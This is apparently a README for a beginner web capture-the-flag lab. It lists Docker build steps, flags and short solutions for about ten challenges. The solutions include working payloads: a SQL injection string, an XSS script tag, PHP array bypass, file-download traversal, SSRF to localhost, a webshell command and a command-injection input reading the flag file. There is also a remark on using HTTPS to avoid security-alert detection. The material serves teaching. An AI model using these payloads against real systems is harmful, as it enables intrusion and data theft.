## KAIBRO BUY

### Build 

docker build -t kaibrobuy .

docker run -ti -p 12345:80 kaibrobuy bash

apachectl start

### flag

FLAG{baby_money_bypass!}

(in the index.php)

### Solution

在前端用瀏覽器工具(F12)把價錢改小

或用burp之類的proxy攔截Request，再改小

---

## Level 1000

### Build 

docker build -t level .

docker run -ti -p 12345:80 level bash

apachectl start

### flag

FLAG{I_like_cookie}

### Solution

把cookie改成1000

---

## Secret Login

### Build 

同上

### flag

FLAG{php_is_s0_fun_XD}

### Solution

密碼傳陣列進去，就會噴flag

/?pass[]=

---

## No Password

### Build

docker build -t nopass .

docker run -ti 12345:443 nopass bash

apachectl start

service mysqld start

cat /user.sql | mysql -u root

cat /mysql.sql | mysql -u root

### flag

FLAG{oh_sqlinj_easy_peasy}

### Solution

閉合掉雙引號和括號，然後讓條件成立

") or 1=1-- 

### 補充

這題包成 https (443 port)

可以避免資安通報的偵測，但是訪問題目會有憑證錯誤(自簽憑證)的頁面

信任該憑證即可訪問題目

---

## alert me

### Build 

docker build -t alertme .

docker run -ti -p 12345:80 alertme bash

apachectl start

### flag

FLAG{my_first_xss_oh_ya!}

### Solution

"><script>alert(1)</script>

---

## Downloader

### Build 

同上

### flag

FLAG{download_my_config}

### Solution

download.php?f=index.php

download.php?f=config.inc.php

---

## SSRF Noob

### Build

同上

### flag

FLAG{ssrf_bypass_limit}

### Solution

http://127.0.0.1/config.php

---

## lightning

### Build

同上

### flag

FLAG{302_redirect_cool}


### solution

curl http://xxxxxx/flag.php

---

## webshell

### Build 

同上

### flag

FLAG{webshell_bang!}

### Solution

post: 123=cat /flag

---

## Cat Digger

### Build 

同上

### flag

FLAG{cat_flag_ez}

### Solution

8.8.8.8;grep%20%27F%27%20/fl*
